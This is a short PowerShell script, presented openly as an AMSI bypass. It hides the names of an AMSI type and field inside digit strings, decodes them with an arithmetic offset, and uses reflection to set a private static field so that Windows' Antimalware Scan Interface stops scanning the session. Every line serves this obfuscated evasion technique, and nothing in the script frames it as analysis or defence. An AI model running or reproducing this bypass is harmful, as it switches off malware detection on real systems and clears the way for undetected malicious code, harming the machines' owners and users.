# Numeric Offset Decode AMSI Bypass
# Encodes type/field names as digit pairs with arithmetic offset

$M="569488897482195070837076748274838919389089848270897884"
$N="8319388288785889788188708288784683788943707881 7473"
$D=($M+$N).Replace(' ','')

$typeName = [string](0..37|%{[char][int](27+$D.substring(($_*2),2))})-replace " "
$fieldName = [string](38..51|%{[char][int](27+$D.substring(($_*2),2))})-replace " "

$ref = [Ref].Assembly.GetType($typeName)
if ($ref) {
    $f = $ref.GetField($fieldName, 'NonPublic,Static')
    if ($f) {
        $f.SetValue($null, $true)
        Write-Host "[+] AMSI Bypass Applied (Numeric Offset Decode)" -ForegroundColor Green
    }
}
